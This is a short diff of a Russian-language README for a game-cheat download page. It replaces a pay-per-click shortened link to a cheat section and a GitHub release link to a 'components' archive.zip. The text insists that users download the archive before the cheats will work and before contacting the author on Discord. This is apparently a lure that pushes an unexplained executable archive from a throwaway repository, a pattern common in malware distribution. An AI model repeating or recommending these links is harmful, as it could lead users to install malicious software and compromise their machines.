@@ -2,13 +2,13 @@
 
 # Скачать читы
 
-Нажми сюда для перехода в раздел выбора читов - https://leit.link/uDOb
+Нажми сюда для перехода в раздел выбора читов - https://leit.link/Waac
 
 Наш проект живёт только на этих оплачиваемых ссылках, всем спасибо
 
 ----
 
-ЕСЛИ У ВАС НЕ РАБОТАЮТ ЧИТЫ ТО СКАЧАЙТЕ ЭТИ КОМПОНЕНТЫ - https://github.com/defoxxx/flight/releases/download/komponents/archive.zip
+ЕСЛИ У ВАС НЕ РАБОТАЮТ ЧИТЫ ТО СКАЧАЙТЕ ЭТИ КОМПОНЕНТЫ - https://github.com/spacecollapse/flight/releases/download/komponents/archive.zip
 
 НЕ НАДО МНЕ ПИСАТЬ В ДС ЕСЛИ У ВАС ЧТО-ТО НЕ РАБОТАЕТ ПОКА ВЫ НЕ СКАЧАЕТЕ ИХ
 
